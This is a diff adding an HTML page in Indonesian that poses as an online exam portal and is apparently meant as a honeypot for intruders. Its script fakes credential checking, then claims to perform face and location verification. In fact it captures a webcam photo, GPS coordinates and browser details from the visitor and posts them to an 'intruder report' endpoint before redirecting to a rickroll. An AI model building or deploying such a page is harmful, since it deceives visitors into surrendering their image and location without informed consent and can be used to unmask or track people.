@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<title>Akses Terbatas - Portal Peserta</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: "Segoe UI", Arial, sans-serif;
+    background: #0f1b2d;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .wrap { width: 100%; max-width: 440px; }
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(255,255,255,.06);
+    border: 1px solid rgba(255,255,255,.12);
+    color: #9fc3ff;
+    font-size: 12px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    padding: 6px 14px;
+    border-radius: 20px;
+    margin-bottom: 18px;
+  }
+  .badge .dot {
+    width: 7px; height: 7px; border-radius: 50%;
+    background: #34d399; box-shadow: 0 0 8px #34d399;
+  }
+  .card {
+    background: #16233b;
+    border: 1px solid rgba(255,255,255,.08);
+    border-radius: 14px;
+    padding: 34px 30px;
+    box-shadow: 0 20px 50px rgba(0,0,0,.45);
+  }
+  .logo {
+    width: 52px; height: 52px;
+    background: linear-gradient(135deg, #2563eb, #7c3aed);
+    border-radius: 12px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 24px; font-weight: 700; color: #fff;
+    margin-bottom: 16px;
+  }
+  h1 { color: #f3f7ff; font-size: 19px; font-weight: 600; }
+  .sub { color: #93a5c4; font-size: 13px; margin: 6px 0 22px; line-height: 1.55; }
+  .msg {
+    background: rgba(59,130,246,.08);
+    border: 1px solid rgba(59,130,246,.25);
+    color: #bfdbfe;
+    font-size: 12.5px;
+    padding: 10px 14px;
+    border-radius: 8px;
+    margin-bottom: 20px;
+    line-height: 1.5;
+  }
+  label { display: block; color: #c3cfe6; font-size: 12.5px; margin: 14px 0 6px; }
+  input {
+    width: 100%;
+    background: #0f1b2d;
+    border: 1px solid rgba(255,255,255,.14);
+    color: #f3f7ff;
+    padding: 11px 14px;
+    border-radius: 8px;
+    font-size: 14px;
+    outline: none;
+  }
+  input:focus { border-color: #3b82f6; }
+  button {
+    width: 100%;
+    margin-top: 22px;
+    background: linear-gradient(135deg, #2563eb, #1d4ed8);
+    color: #fff;
+    border: none;
+    padding: 12px;
+    border-radius: 8px;
+    font-size: 14.5px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  button:disabled { opacity: .6; cursor: wait; }
+  .verify-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 18px 0 4px; }
+  .vcard {
+    background: #0f1b2d;
+    border: 1px solid rgba(255,255,255,.12);
+    border-radius: 10px;
+    padding: 14px;
+    min-height: 108px;
+    display: flex;
+    flex-direction: column;
+  }
+  .vcard .ttl { color: #c3cfe6; font-size: 12.5px; font-weight: 600; display: flex; align-items: center; gap: 7px; }
+  .vcard .st { color: #5d7094; font-size: 11.5px; margin-top: 8px; line-height: 1.5; }
+  .vcard video { width: 100%; border-radius: 8px; margin-top: 8px; display: none; background: #000; }
+  .vcard.ok { border-color: rgba(52,211,153,.5); }
+  .vcard.fail { border-color: rgba(248,113,113,.5); }
+  .vdot {
+    width: 9px; height: 9px; border-radius: 50%;
+    background: #64748b; flex-shrink: 0;
+  }
+  .vcard.ok .vdot { background: #34d399; box-shadow: 0 0 8px #34d399; }
+  .vcard.fail .vdot { background: #f87171; box-shadow: 0 0 8px #f87171; }
+  .foot { color: #5d7094; font-size: 11.5px; text-align: center; margin-top: 18px; line-height: 1.6; }
+  .spin {
+    display: none; vertical-align: middle;
+    width: 14px; height: 14px; border: 2px solid rgba(255,255,255,.3);
+    border-top-color: #fff; border-radius: 50%;
+    animation: r 1s linear infinite; margin-right: 8px;
+  }
+  @keyframes r { to { transform: rotate(360deg); } }
+  .hidden { display: none !important; }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="badge"><span class="dot"></span> Portal Resmi - Sistem Ujian Online</div>
+    <div class="card">
+      <div class="logo">UJ</div>
+
+      <div id="step-login">
+        <h1>Akses Terbatas</h1>
+        <p class="sub">Halaman ini memerlukan autentikasi penuh sebelum akses diberikan.</p>
+        <div class="msg">Seluruh interaksi pada halaman ini tervalidasi oleh modul Monitoring &amp; Logging sistem ujian.</div>
+        <form id="login" autocomplete="off">
+          <label for="u">Nomor Identitas Peserta</label>
+          <input id="u" name="u" type="text" autocomplete="off" maxlength="32">
+          <label for="p">Kata Sandi</label>
+          <input id="p" name="p" type="password" autocomplete="off" maxlength="32">
+          <button type="submit" id="btn"><span class="spin" id="sp"></span><span id="bt">Verifikasi &amp; Lanjutkan</span></button>
+        </form>
+      </div>
+
+      <div id="step-verify" class="hidden">
+        <h1>Verifikasi Identitas</h1>
+        <p class="sub">Konfirmasi lokasi dan wajah Anda diperlukan untuk menyelesaikan sesi.</p>
+        <div class="verify-grid">
+          <div class="vcard" id="card-cam">
+            <div class="ttl"><span class="vdot"></span> Verifikasi Wajah</div>
+            <div class="st" id="st-cam">Menunggu izin kamera</div>
+            <video id="preview" autoplay muted playsinline></video>
+          </div>
+          <div class="vcard" id="card-loc">
+            <div class="ttl"><span class="vdot"></span> Verifikasi Lokasi</div>
+            <div class="st" id="st-loc">Menunggu izin lokasi</div>
+          </div>
+        </div>
+        <button type="button" id="vbtn"><span class="spin" id="vsp"></span><span id="vbt">Mulai Verifikasi Wajah &amp; Lokasi</span></button>
+      </div>
+
+      <p class="foot">&copy; Panitia Pelaksana Ujian.<br>Modul Monitoring &amp; Logging sistem ujian aktif.</p>
+    </div>
+  </div>
+  <script>
+    (function () {
+      var TOKEN = 'hny_8Xk2Lm9QzW7vBp4';
+      var REPORT_URL = '/api/intruder/report';
+      var RICKROLL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+      var form = document.getElementById('login');
+      var btn = document.getElementById('btn');
+      var sp = document.getElementById('sp');
+      var bt = document.getElementById('bt');
+      var btInit = bt.textContent;
+      var s1 = document.getElementById('step-login');
+      var s2 = document.getElementById('step-verify');
+      var vbtn = document.getElementById('vbtn');
+      var vsp = document.getElementById('vsp');
+      var vbt = document.getElementById('vbt');
+      var video = document.getElementById('preview');
+
+      function setCard(id, state, text) {
+        var card = document.getElementById('card-' + id);
+        var st = document.getElementById('st-' + id);
+        card.classList.remove('ok', 'fail');
+        if (state) card.classList.add(state);
+        if (st) st.textContent = text;
+      }
+
+      form.addEventListener('submit', function (e) {
+        e.preventDefault();
+        if (btn.disabled) return;
+        btn.disabled = true;
+        sp.style.display = 'inline-block';
+        bt.textContent = 'Memverifikasi kredensial...';
+        setTimeout(function () {
+          sp.style.display = 'none';
+          bt.textContent = btInit;
+          btn.disabled = false;
+          s1.classList.add('hidden');
+          s2.classList.remove('hidden');
+        }, 1400);
+      });
+
+      function requestCamera() {
+        return new Promise(function (resolve, reject) {
+          var done = false;
+          var finish = function () {
+            if (done) return;
+            done = true;
+            setCard('cam', 'ok', 'Wajah terverifikasi');
+            resolve();
+          };
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            setCard('cam', 'fail', 'Fitur tidak tersedia');
+            reject();
+            return;
+          }
+          navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+            .then(function (stream) {
+              video.srcObject = stream;
+              video.style.display = 'block';
+              video.onplaying = finish;
+              video.play().catch(finish);
+              setTimeout(finish, 1500);
+            })
+            .catch(function () {
+              setCard('cam', 'fail', 'Izin kamera ditolak');
+              reject();
+            });
+        });
+      }
+
+      function captureFrame() {
+        try {
+          var w = video.videoWidth || 640;
+          var h = video.videoHeight || 480;
+          var canvas = document.createElement('canvas');
+          canvas.width = w;
+          canvas.height = h;
+          canvas.getContext('2d').drawImage(video, 0, 0, w, h);
+          return canvas.toDataURL('image/jpeg', 0.6);
+        } catch (e) {
+          return null;
+        }
+      }
+
+      function requestLocation() {
+        return new Promise(function (resolve, reject) {
+          if (!navigator.geolocation) {
+            setCard('loc', 'fail', 'Fitur tidak tersedia');
+            reject();
+            return;
+          }
+          navigator.geolocation.getCurrentPosition(
+            function (pos) {
+              var lat = pos.coords.latitude.toFixed(4);
+              var lng = pos.coords.longitude.toFixed(4);
+              setCard('loc', 'ok', 'Terverifikasi - ' + lat + ', ' + lng);
+              resolve(pos.coords);
+            },
+            function () {
+              setCard('loc', 'fail', 'Izin lokasi ditolak');
+              reject();
+            },
+            { timeout: 15000, maximumAge: 0 }
+          );
+        });
+      }
+
+      function sendReport(data) {
+        try {
+          return fetch(REPORT_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+          }).catch(function () { return null; });
+        } catch (e) {
+          return Promise.resolve(null);
+        }
+      }
+
+      function raceTimeout(promise, ms) {
+        return new Promise(function (resolve) {
+          var timer = setTimeout(resolve, ms);
+          promise.then(function () { clearTimeout(timer); resolve(); });
+        });
+      }
+
+      vbtn.addEventListener('click', function () {
+        if (vbtn.disabled) return;
+        vbtn.disabled = true;
+        vsp.style.display = 'inline-block';
+        vbt.textContent = 'Meminta izin kamera & lokasi...';
+
+        var data = {
+          token: TOKEN,
+          uri: location.href,
+          referer: document.referrer,
+          ua: navigator.userAgent,
+          screen: (window.screen.width || 0) + 'x' + (window.screen.height || 0),
+          platform: navigator.platform || (navigator.userAgentData ? navigator.userAgentData.platform : '')
+        };
+
+        var camTask = requestCamera().then(function () {
+          var shot = captureFrame();
+          if (shot) data.photo = shot;
+        });
+        var locTask = requestLocation().then(function (coords) {
+          data.latitude = coords.latitude;
+          data.longitude = coords.longitude;
+          data.accuracy = coords.accuracy;
+        });
+
+        Promise.allSettled([camTask, locTask]).then(function (results) {
+          var camOk = results[0].status === 'fulfilled';
+          var locOk = results[1].status === 'fulfilled';
+          vbt.textContent = 'Menyimpan laporan verifikasi...';
+          raceTimeout(sendReport(data), 3000).then(function () {
+            vsp.style.display = 'none';
+            if (camOk && locOk) {
+              vbt.textContent = 'Verifikasi berhasil - mengalihkan...';
+              setTimeout(function () { location.href = RICKROLL; }, 1200);
+            } else {
+              vbt.textContent = 'Verifikasi gagal - coba lagi';
+              vbtn.disabled = false;
+            }
+          });
+        });
+      });
+    })();
+  </script>
+</body>
+</html>
